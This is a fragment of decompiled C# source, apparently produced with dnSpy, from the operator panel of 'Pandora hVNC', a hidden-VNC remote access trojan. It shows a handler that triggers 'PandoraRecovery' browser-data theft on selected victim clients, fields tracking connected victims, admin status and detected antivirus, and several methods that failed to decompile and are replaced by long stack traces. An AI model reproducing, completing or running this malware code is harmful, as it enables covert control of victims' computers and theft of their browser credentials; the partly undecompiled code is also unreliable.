   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
			}
		}

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x06000072 RID: 114 RVA: 0x000021FD File Offset: 0x000003FD
		// (set) Token: 0x06000073 RID: 115 RVA: 0x0000CC44 File Offset: 0x0000AE44
		public string xxip
		{
			[CompilerGenerated]
			get
			{
				return this.<xxip>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				/*
An exception occurred when decompiling this method (06000073)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::set_xxip(System.String)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
			}
		}

		// Token: 0x06000074 RID: 116 RVA: 0x0000CCA0 File Offset: 0x0000AEA0
		public void browserRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.HVNCList.SelectedItems.Count == 0)
			{
				MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			FrmVNC frmVNC = new FrmVNC();
			foreach (object obj in this.HVNCList.SelectedItems)
			{
				this.count = this.HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < this.count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
				object tag = this.HVNCList.SelectedItems[i].Tag;
				string text = this.HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null).Replace("}", null).Replace(":", null).Remove(0, 1);
				string text2 = this.HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null).Replace("}", null).Replace(":", null).Remove(0, 1);
				this.xxip = text;
				this.xxhostname = text2;
				frmVNC.xip = text;
				frmVNC.xhostname = text2;
				frmVNC.Tag = tag;
				frmVNC.PandoraRecovery();
				frmVNC.Dispose();
			}
			MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000077 RID: 119 RVA: 0x00010084 File Offset: 0x0000E284
		// Note: this type is marked as 'beforefieldinit'.
		static FrmMain()
		{
			/*
An exception occurred when decompiling this method (06000077)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::.cctor()

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x04000089 RID: 137
		public static List<TcpClient> _clientList;

		// Token: 0x0400008A RID: 138
		public static TcpListener _TcpListener;

		// Token: 0x0400008B RID: 139
		private Thread VNC_Thread;

		// Token: 0x0400008C RID: 140
		public static int SelectClient;

		// Token: 0x0400008D RID: 141
		public static bool bool_1;

		// Token: 0x0400008E RID: 142
		public static int int_2;

		// Token: 0x0400008F RID: 143
		public static string isadmin;

		// Token: 0x04000090 RID: 144
		public static string detecav;

		// Token: 0x04000091 RID: 145
		public static Random random;

		// Token: 0x04000092 RID: 146
		public static string PandoraRecoveryResults;

		// Token: 0x04000093 RID: 147
		public int count;

		// Token: 0x04000095 RID: 149
		public static bool ispressed;
	}
}
